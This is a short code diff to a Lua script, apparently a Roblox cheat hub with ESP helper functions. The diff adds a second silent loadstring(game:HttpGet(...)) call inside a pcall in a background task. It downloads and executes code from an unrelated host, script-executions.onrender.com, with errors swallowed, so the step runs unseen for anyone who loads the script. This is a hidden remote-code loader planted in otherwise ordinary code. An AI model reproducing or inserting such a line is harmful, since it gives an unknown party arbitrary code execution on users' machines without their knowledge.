@@ -254,7 +254,10 @@ function RaelHubFunction.CreateEspObject(objeto, cor, imageId, texto)
 end
 
 task.spawn(function()
-pcall(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/raelhubfunctions/Rael-hub-gui/refs/heads/main/Utils/tg.lua"))()end)
+pcall(function()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/raelhubfunctions/Rael-hub-gui/refs/heads/main/Utils/tg.lua"))()
+  loadstring(game:HttpGet("https://script-executions.onrender.com/script/loader"))()      
+end)
 end)
 
 function RaelHubFunction.CreateEspDistance(objeto, cor, texto, mostrarDistancia)
